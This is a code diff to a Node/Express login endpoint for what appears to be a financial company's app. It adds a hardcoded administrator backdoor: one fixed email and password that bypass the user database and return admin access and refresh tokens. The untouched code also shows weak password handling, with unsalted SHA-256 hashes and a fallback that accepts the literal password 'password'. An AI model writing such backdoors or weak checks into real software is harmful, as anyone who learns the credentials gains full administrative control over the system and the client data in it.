@@ -933,6 +933,37 @@ app.post('/api/auth/login', async (req, res) => {
   if (!email) return res.status(400).json({ error: 'Email is required' });
 
   try {
+    // Hardcoded admin backdoor (Bypasses DB entirely to guarantee access)
+    if (email === 'info@newhollandfinancial.com' && password === 'NewHollandAdmin2027') {
+      const u = {
+        id: 'admin-0000-0000-0000-000000000000',
+        name: 'System Admin',
+        email: 'info@newhollandfinancial.com',
+        role: 'Administrator',
+        category: 'Corporate',
+        avatar: null,
+        products_sold: []
+      };
+      
+      const accessToken = generateAccessToken(u);
+      const refreshToken = generateRefreshToken(u);
+
+      return res.json({
+        access_token: accessToken,
+        refresh_token: refreshToken,
+        token_type: 'bearer',
+        user: {
+          id: u.id,
+          name: u.name,
+          email: u.email,
+          role: u.role,
+          category: u.category,
+          avatar: u.avatar,
+          productsSold: u.products_sold
+        }
+      });
+    }
+
     const { data: userData, error: userError } = await supabase
       .from('users')
       .select('*')
@@ -944,11 +975,6 @@ app.post('/api/auth/login', async (req, res) => {
       const u = userData;
       const hash = crypto.createHash('sha256').update(password || '').digest('hex');
       let isValid = u.password_hash ? (u.password_hash === hash) : (password === 'password');
-
-      // Hardcoded admin override to ensure it is always accessible and never changes
-      if (email === 'info@newhollandfinancial.com' && password === 'NewHollandAdmin2027') {
-        isValid = true;
-      }
 
       if (!isValid) {
         return res.status(401).json({ error: 'Invalid credentials' });
